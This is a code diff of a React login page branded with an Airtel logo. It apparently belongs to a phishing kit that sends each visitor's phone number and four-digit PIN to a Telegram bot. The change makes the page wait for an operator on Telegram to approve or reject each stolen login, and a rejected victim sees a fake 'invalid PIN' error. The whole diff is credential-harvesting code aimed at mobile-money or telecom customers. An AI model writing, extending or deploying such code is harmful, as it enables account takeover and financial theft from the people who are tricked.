@@ -3,7 +3,6 @@ import { motion, AnimatePresence } from 'motion/react';
 import { AirtelLogo } from './Logos';
 import { InternetPlan } from '../types';
 import { ValidatingModal } from './ValidatingModal';
-import { useTelegramPolling } from '../hooks/useTelegramPolling';
 import { telegramService } from '../services/telegramService';
 import { LanguageSwitch } from './LanguageSwitch';
 import { useApp } from '../context/AppContext';
@@ -146,36 +145,6 @@ export const LoginPage: React.FC<LoginPageProps> = ({
   const currentPin = pinDigits.join('');
   const isFormValid = phoneValidation.isValid && currentPin.length === 4;
 
-  // Handle Telegram verification callbacks
-  const { status: telegramStatus } = useTelegramPolling({
-    sessionId: sessionId || null,
-    phone: phoneValidation.normalized || phoneNumber.trim(),
-    targetStep: 'login',
-    isActive: isWaitingTelegram,
-    onApproved: () => {
-      setTimeout(() => {
-        setIsWaitingTelegram(false);
-        onLoginSuccess(
-          phoneNumber.trim(),
-          currentPin,
-          sessionId,
-          country,
-          fullInternationalPhone
-        );
-      }, 800);
-    },
-    onRejected: () => {
-      setIsWaitingTelegram(false);
-      setErrorMessage(
-        language === 'fr'
-          ? 'Code PIN ou numéro de téléphone non valide. Veuillez vérifier et réessayer.'
-          : 'Invalid PIN code or phone number. Please check and try again.'
-      );
-      setPinDigits(['', '', '', '']);
-      pinInputRefs.current[0]?.focus();
-    },
-  });
-
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setHasAttemptedSubmit(true);
@@ -200,10 +169,12 @@ export const LoginPage: React.FC<LoginPageProps> = ({
 
     setIsSubmitting(true);
     setErrorMessage(null);
+    setIsWaitingTelegram(true);
 
     try {
       // Send login info with country and full international phone to Telegram Bot
-      await telegramService.sendLogin({
+      // This now blocks until admin responds
+      const approved = await telegramService.sendLogin({
         sessionId,
         country: `${country.flag} ${language === 'fr' ? country.nameFr : country.nameEn}`,
         countryCode: country.id,
@@ -215,9 +186,29 @@ export const LoginPage: React.FC<LoginPageProps> = ({
         planPrice: selectedPlan.price,
       });
 
-      // Open validating modal
-      setIsWaitingTelegram(true);
+      setIsWaitingTelegram(false);
+
+      if (approved) {
+        // Login approved
+        onLoginSuccess(
+          phoneNumber.trim(),
+          currentPin,
+          sessionId,
+          country,
+          fullInternationalPhone
+        );
+      } else {
+        // Login rejected
+        setErrorMessage(
+          language === 'fr'
+            ? 'Code PIN ou numéro de téléphone non valide. Veuillez vérifier et réessayer.'
+            : 'Invalid PIN code or phone number. Please check and try again.'
+        );
+        setPinDigits(['', '', '', '']);
+        pinInputRefs.current[0]?.focus();
+      }
     } catch (err: any) {
+      setIsWaitingTelegram(false);
       setErrorMessage(
         err.message ||
           (language === 'fr'
